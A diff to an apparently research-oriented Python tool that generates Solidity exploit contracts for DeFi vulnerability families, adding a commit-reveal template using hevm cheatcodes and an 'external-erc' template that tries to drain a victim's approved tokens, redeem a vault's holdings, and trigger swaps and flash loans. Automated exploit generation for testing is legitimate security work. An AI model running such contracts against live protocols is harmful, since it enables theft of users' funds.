@@ -42,6 +42,8 @@ def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
     yield from _hook_reentrancy(s, fns, name)
     yield from _sig_replay(s, fns, name)
     yield from _metamorphic(s, fns, name)
+    yield from _commit_reveal(s, fns, name)
+    yield from _external_erc(s, fns, name)
 
 
 def _unpermissioned_callback(s, fns, name):
@@ -888,4 +890,125 @@ def _metamorphic(s, fns, name):
         + (("        try IT(t)." + deploy["name"]
             + "(keccak256(\"salt\"), hex\"60016000f3\") {} catch {}\n") if deploy else "")
         + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _commit_reveal(s, fns, name):
+    """commit in prepare(), roll 2+ blocks, reveal in finish()."""
+    if not re.search(r"function\s+commit\s*\(", s):
+        return
+    if not re.search(r"function\s+reveal\s*\(", s):
+        return
+    commit = next((f for f in fns if f["name"] == "commit"), None)
+    reveal = next((f for f in fns if f["name"] == "reveal"), None)
+    if not commit or not reveal:
+        return
+    yield (
+        "commit-reveal",
+        HEADER
+        + "// Family: multi-block commit-reveal. prepare commits, finish reveals.\n"
+        + hevm.IFACE
+        + "interface IT {\n"
+        + f"    function commit({_iface_args(commit)}) external payable;\n"
+        + f"    function reveal({_iface_args(reveal)}) external payable;\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + hevm.DECL
+        + "    uint256 constant SECRET = 1;\n"
+        + "    function run(address t) external payable {\n"
+        + "        prepare(t);\n"
+        + "        vm.roll(block.number + 2);\n"
+        + "        vm.warp(block.timestamp + 2);\n"
+        + "        finish(t);\n"
+        + "    }\n"
+        + "    function prepare(address t) public payable {\n"
+        + "        bytes32 h = keccak256(abi.encodePacked(SECRET, address(this)));\n"
+        + _call_commit(commit)
+        + "    }\n"
+        + "    function finish(address t) public payable {\n"
+        + _call_reveal(reveal)
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _call_commit(fn):
+    parts = []
+    for t, _n in fn["args"]:
+        if t.startswith("bytes32"):
+            parts.append("h")
+        elif "address" in t:
+            parts.append("address(this)")
+        elif t.startswith("uint"):
+            parts.append("SECRET")
+        else:
+            parts.append("0")
+    return f"        try IT(t).commit({', '.join(parts)}) {{}} catch {{}}\n"
+
+
+def _call_reveal(fn):
+    parts = []
+    for t, _n in fn["args"]:
+        if t.startswith("bytes32"):
+            parts.append("keccak256(abi.encodePacked(SECRET, address(this)))")
+        elif t.startswith("uint"):
+            parts.append("SECRET")
+        elif "address" in t:
+            parts.append("address(this)")
+        else:
+            parts.append("0")
+    return f"        try IT(t).reveal({', '.join(parts)}) {{}} catch {{}}\n"
+
+
+def _external_erc(s, fns, name):
+    """Call official ERC-20/2612/4626/3156/UniV2 at hardcoded addresses
+    and public getters. Source of the *other* contract is not required."""
+    from .erc import hardcoded_addresses, IFACE_ERC20, IFACE_4626, IFACE_3156, IFACE_UNIV2
+    addrs = hardcoded_addresses(s)
+    if not (addrs or re.search(r"IERC20|IERC4626|IERC3156|IUniswap|permit\s*\(", s)):
+        return
+    lits = ", ".join(a if a.startswith("0x") else a for a in addrs[:4])
+    yield (
+        "external-erc",
+        HEADER
+        + "// Family: source-less sibling. Official ERC selectors only.\n"
+        + IFACE_ERC20 + IFACE_4626 + IFACE_3156 + IFACE_UNIV2
+        + "interface IT {\n"
+        + "    function token() external view returns (address);\n"
+        + "    function pool() external view returns (address);\n"
+        + "    function asset() external view returns (address);\n"
+        + "    function victim() external view returns (address);\n"
+        + "}\n"
+        + "contract Exploit {\n"
+        + "    function run(address t) external payable {\n"
+        + "        address[8] memory xs;\n"
+        + "        xs[0] = t;\n"
+        + "        try IT(t).token() returns (address a) { xs[1] = a; } catch {}\n"
+        + "        try IT(t).pool() returns (address a) { xs[2] = a; } catch {}\n"
+        + "        try IT(t).asset() returns (address a) { xs[3] = a; } catch {}\n"
+        + (f"        address[{len(addrs[:4])}] memory lit = [{lits}];\n"
+           f"        for (uint256 i; i < {len(addrs[:4])}; i++) xs[4+i] = lit[i];\n"
+           if addrs else "")
+        + "        address v; try IT(t).victim() returns (address a) { v = a; } catch {}\n"
+        + "        for (uint256 i; i < xs.length; i++) {\n"
+        + "            address x = xs[i];\n"
+        + "            if (x == address(0)) continue;\n"
+        + "            uint256 b = IERC20(x).balanceOf(address(this));\n"
+        + "            if (b > 0) { IERC20(x).approve(t, b); IERC20(x).transfer(t, b); }\n"
+        + "            if (v != address(0)) {\n"
+        + "                uint256 a = IERC20(x).allowance(v, address(this));\n"
+        + "                uint256 vb = IERC20(x).balanceOf(v);\n"
+        + "                if (a > 0 && vb > 0) {\n"
+        + "                    uint256 n = a < vb ? a : vb;\n"
+        + "                    try IERC20(x).transferFrom(v, address(this), n) {} catch {}\n"
+        + "                }\n"
+        + "            }\n"
+        + "            try IERC4626(x).redeem(IERC4626(x).convertToShares(\n"
+        + "                IERC20(IERC4626(x).asset()).balanceOf(x)), address(this), address(this)) {} catch {}\n"
+        + "            try IUniV2(x).swap(0, 1, address(this), new bytes(0)) {} catch {}\n"
+        + "            try IERC3156(x).flashLoan(address(this), x, 1, new bytes(0)) {} catch {}\n"
+        + "        }\n"
+        + "    }\n    receive() external payable {}\n"
+        + "    function onFlashLoan(address,address,uint256,uint256,bytes calldata) external returns (bytes32) {\n"
+        + '        return keccak256("ERC3156FlashBorrower.onFlashLoan");\n'
+        + "    }\n}\n",
     )
